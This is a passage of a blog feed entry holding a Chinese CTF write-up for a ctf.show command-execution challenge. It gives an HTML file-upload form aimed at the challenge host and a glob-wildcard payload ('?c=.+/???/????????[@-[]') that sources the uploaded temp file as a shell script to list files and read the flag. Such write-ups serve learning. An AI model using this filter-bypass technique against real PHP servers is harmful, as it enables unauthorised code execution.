+<p>好，接下来我已一个小白的角度分析题目所需的知识点。 首先是构造一个post文件上传，这里面也是很复杂的，参考 <a href="https://www.runoob.com/php/php-file-upload.html">PHP 文件上传 </a></p>
+<p><strong>下面就是我们构造的post文件上传数据包</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后直接抓包</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200259866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+接下来构造poc命令<br>
+<code>?c=.+/???/????????[@-[]</code><br>
+用到Linux下的glob通配符：</p>
+<ul>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符<br>
+注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
+<img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<p>介绍一下<strong>bin目录:</strong></p>
+<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
+<p>在这里再解释一下为什么加上#！  #!的意思是调用  /bin/sh 命令所以需要加</p>
+<p>成功遍历当前目录文件<br>
+<img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>直接cat 得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200444686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>补充</strong></p>
+<p>1.playload:?c=.+/???/???[@-[] 因为 .命令 (也就是source命令)执行需要用空格 我们用 + 绕过（也就是%20）。</p>
+<p>2.文件上传的时候 #!/bin/sh 加上 #！的意思是调用bin/sh的命令</p>
+<p>3.我们的poc的? 的数量只有11个，因为最后一个匹配为大写，用[@-[] 代替了，不需要在它的后面再加上?了</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
